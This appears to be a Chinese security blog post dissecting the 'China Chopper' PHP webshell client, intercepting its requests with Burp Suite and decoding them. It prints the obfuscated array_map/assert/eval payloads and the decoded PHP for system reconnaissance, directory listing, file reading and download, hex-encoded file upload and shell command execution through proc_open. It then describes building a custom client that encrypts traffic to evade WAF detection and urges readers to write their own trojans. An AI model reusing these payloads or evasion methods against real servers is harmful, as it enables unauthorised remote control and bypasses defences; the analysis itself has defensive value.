## 0x01前言

中国菜刀，是一款十分强大好用的网站管理软件，具体功能也就不再这里赘述了，网上有许多资料。中国菜刀一直被流传存在后门，本文先对中国菜刀几个主要功能进行了代码分析，担心后门的同学也可以根据这个思路按自己需求提炼出代码进行使用。本文以php一句话连接使用为例。

## 0x02 实验工具

1、Burpsuit

2、中国菜刀(20160620)

## 0x03 环境准备

1、 在自己的测试网站下放入一句话服务端文件。

![image.png](https://image.3001.net/images/20180330/15223792864589.png!small)

2、 设置Internet
Explorer浏览器代理。如果在局域网设置选项填写保存完代理服务器地址，burpsuit未成功拦截菜刀数据包，可点击高级按钮，检查目标ip段是否在例外中。

![image.png](https://image.3001.net/images/20180330/15223793013526.png!small)  

3、使用菜刀连接一句话服务端时burpsuit出现如下请求，证明拦截成功，可以开始进行分析。

![image.png](https://image.3001.net/images/20180330/15223793152792.png!small)  

Tips:菜刀客户端对于网站会有缓存，在分析过程中会进行反复的清缓存操作。

## 0x04 代码分析

1、基本信息获取。双击我们新建的webshell条目，我们会进入如下界面。该界面展示的信息是由两次post数据提交获取到的

(1)第一次post，获取一句话服务端脚本文件所在物理目录、运行php的系统信息以及执行脚本的用户名。

Burpsuit拦截到的请求代码如下：

    
    
    dd=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));\");"));

对base64加密部分进行解密得到如下代码：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') {
        @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $D = dirname(__FILE__);
    $R = "{$D}\t";
    if (substr($D, 0, 1) != "/") {
        foreach (range("A", "Z") as $L) if(is_dir("{$L}:")) $R.= "{$L}:";
    }
    $R.= "\t";
    $u = (function_exists('posix_getegid')) ?@posix_getpwuid(@posix_geteuid()) : '';
    $usr = ($u) ? $u['name'] : @get_current_user();
    $R.= php_uname();
    $R.= "({$usr})";
    print $R;;
    echo ("X@Y");
    die();

a、使用dirname(__FILE__)获取脚本文件所在的绝对物理目录,存储在$D变量中。

b、$R变量存储最终要返回的所有信息，使用\t进行分割。

c、substr($D, 0,1) !=
"/"作为判断语句条件，判断$D的首个字符是否为“/”，目的是确定目标系统为linux还是windows。若为windows，则遍历判断A-Z盘符是否存在并将存在的盘符号存储到$R中。

d、posix_getpwuid()、get_current_user()函数是为获取执行脚本用户名，php_uname()函数为获取运行php系统信息。

e、echo("X@Y");这只是定界符，为了方便客户端获取信息。但是有些基于DPI的webshell检测工具可能会将”X@Y”作为特征字符串。

Burpsuit返回信息：

![image.png](https://image.3001.net/images/20180330/15223793935809.png!small)  

(2)第二次post,获取一句话脚本文件所属目录下的所有目录文件、修改时间、权限和文件大小信息。解密后代码如下：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') {
       @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $D = '/usr/share/nginx/html/';
    $F = @opendir($D);
    if ($F == NULL) {
        echo ("ERROR:// PathNot Found Or No Permission!");
    } else {
        $M = NULL;
        $L = NULL;
        while ($N = @readdir($F)){
            $P = $D . '/' . $N;
            $T = @date("Y-m-dH:i:s", @filemtime($P));
            @$E =substr(base_convert(@fileperms($P) , 10, 8) , -4);
            $R = "\t" .$T . "\t" . @filesize($P) . "\t" . $E . "\n";
            if (@is_dir($P)) $M.=$N . "/" . $R;
            else $L.= $N . $R;
        }
        echo $M . $L;
        @closedir($F);
     };
    echo ("X@Y");
    die();

a、@opendir($D);获取所属目录下的所有目录文件。  

b、filemtime()、fileperms()、filesize()获取修改时间、权限、文件大小信息。

Burpsuit返回信息：

![image.png](https://image.3001.net/images/20180330/15223794041594.png!small)

2、查看文件内容。示例为查看本地网站下2.php文件内容。解密后代码如下：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') {
       @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $F = '/usr/share/nginx/html/2.php';
    $P = @fopen($F, 'r');
    echo (@fread($P, filesize($F)));
    @fclose($P);;
    echo ("X@Y");
    die();

a、 使用fopen、fread函数组合获取文件内容  

Burpsuit返回信息：

![image.png](https://image.3001.net/images/20180330/15223794334644.png!small)

3、文件下载。示例为下载本地网站下2.php文件。解密后代码如下：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') { 
        @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $F = "/usr/share/nginx/html/2.php";
    $fp = @fopen($F, 'r');
    if (@fgetc($fp)) { 
        @fclose($fp); 
        @readfile($F);
    } else { 
        echo ('ERROR://Can NotRead');
    };
    echo ("X@Y");
    die();

a、fgetc()函数从文件句柄中获取一个字符，目的是判断文件是否可读，如果可读，使用readfile()函数获取文件所有内容到标准输出中

4、文件上传。示例为上传uploadtest.txt文件。

Burpsuit拦截代码如下：

    
    
    ⅆ=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9Jy91c3Ivc2hhcmUvbmdpbngvaHRtbC91cGxvYWR0ZXN0LnR4dCc7JGM9JF9QT1NUWyJ6MSJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoJyUnLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCd3JyksJGJ1Zik%2FJzEnOicwJyk7O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D'));\");"));&z1=746869732069732075706C6F61642074657374

解密后代码如下：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') {
        @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $f='usr/share/nginx/html/uploadtest.txt';
    $c = $_POST["z1"];
    $c = str_replace("\r", "", $c);
    $c = str_replace("\n", "", $c);
    $buf = "";
    for ($i = 0;$i < strlen($c);$i+= 2) $buf.= urldecode('%' .substr($c, $i, 2));
    echo (@fwrite(fopen($f, 'w'), $buf) ? '1' : '0');;
    echo ("X@Y");
    die();

  

a、$c=$_POST[“z1”],本例中z1变量内容为74686973206973207570，实际是将上传文件内容进行了16进制转换。之后使用urldecode将16进制转回为字符。这是一个不错的隐藏关键代码的思路。

![image.png](https://image.3001.net/images/20180330/15223794494990.png!small)  

  
![image.png](https://image.3001.net/images/20180330/1522379456181.png!small)

5、虚拟终端命令执行。示例执行的命令为uname -a。解密后代码如下：

    
    
    @ini_set("display_errors", "0");
    @set_time_limit(0);
    if (PHP_VERSION < '5.3.0') {
        @set_magic_quotes_runtime(0);
    };
    echo ("X@Y");
    $m = get_magic_quotes_gpc();
    $p = '/bin/sh';
    $s = 'cd /usr/share/nginx/html/;uname -a;echo [S];pwd;echo [E]';
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
    $c = substr($d, 0, 1) == "/" ? "-c\"{$s}\"" : "/c \"{$s}\"";
    $r = "{$p} {$c}";
    $array = array(array("pipe", "r"),array("pipe", "w"), array("pipe","w"));
    $fp = proc_open($r . " 2>&1", $array, $pipes);
    $ret = stream_get_contents($pipes[1]);
    proc_close($fp);
    print $ret;;
    echo ("X@Y");
    die();

  

a、$d =dirname($_SERVER["SCRIPT_FILENAME"]);获取脚本文件的所属目录

b、$c = substr($d, 0, 1) == "/" ?"-c \"{$s}\"" : "/c
\"{$s}\"";判断所属目录第一个字符是否为”/”，若是，则$c值为-c，若不是，则值为/c。如此，linux下用于执行命令语句为/bin/sh -c
(command)，windows下用于执行命令语句为cmd /c (command)。

c、使用proc_open函数作为执行函数。有关proc_open的函数说明可以看这里：[http://php.net/manual/zh/function.proc-open.php。](http://php.net/manual/zh/function.proc-open.php%E3%80%82)

小彩蛋：

![image.png](https://image.3001.net/images/20180330/15223794692009.png!small)  

  
![image.png](https://image.3001.net/images/20180330/15223794767476.png!small)  

  
![image.png](https://image.3001.net/images/20180330/15223794811845.png!small)  

## 0x05 客户端制作示例

笔者在菜刀的php命令执行模块代码的基础上，制作php一句话客户端，可以对post数据做加密处理，用于绕过waf对菜刀数据特征的检测。

一句话木马如下：

  

  

效果如下：

![image.png](https://image.3001.net/images/20180330/15223794945867.png!small)  

[示例脚本代码地址](https://github.com/icukeup/webshell/blob/master/php-webshell-client/phpc.php)  

## 0x06 结束语  

绕过对菜刀特征的检测，除了自己写客户端外，还可以写php转发程序，参考文章：<https://blog.csdn.net/h4ck0ne/article/details/50570779>。

亦可使用新版菜刀的自定义配置功能，参考文章：<https://www.scanfsec.com/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%88%E8%8F%9C%E5%88%80%E8%BF%87waf.html>

中国菜刀里融合了作者许多优秀的思想，本文只是以php为例抛砖引玉，读者可以根据此分析思路自行分析菜刀的其他功能，或者直接阅读菜刀配置文件caidao.conf，以此为基础，写出灵活的小马，或者制作属于自己的一句话客户端。

